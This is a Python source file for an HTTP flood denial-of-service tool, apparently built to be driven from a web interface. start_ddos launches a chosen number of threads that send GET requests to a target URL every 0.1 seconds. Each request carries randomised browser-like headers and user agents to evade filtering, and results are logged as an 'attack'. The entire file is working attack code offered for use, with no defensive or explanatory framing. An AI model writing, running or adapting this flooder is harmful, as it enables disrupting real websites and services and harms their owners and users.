
import requests
import random
import time
from threading import Thread
from user_agent import generate_user_agent

threads = []
should_run = True

def HEAD():
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "identity",
        "Accept-Charset": "utf-8",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Referer": "https://www.google.com/",
        "DNT": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Connection": "keep-alive",
        "User-Agent": str(generate_user_agent())
    }
    return headers

def worker(url, socketio):
    while should_run:
        try:
            headers = HEAD()
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                socketio.emit("log", f"[GOOD] {url}")
            else:
                socketio.emit("log", f"[WARN] Status {response.status_code}")
        except Exception as e:
            socketio.emit("log", f"[FAIL] {str(e)}")
        time.sleep(0.1)

def start_ddos(url, num, socketio):
    global threads, should_run
    should_run = True
    threads = []
    socketio.emit("log", f"Starting attack on {url} with {num} threads...")
    for _ in range(num):
        t = Thread(target=worker, args=(url, socketio), daemon=True)
        threads.append(t)
        t.start()

def stop_ddos():
    global should_run
    should_run = False
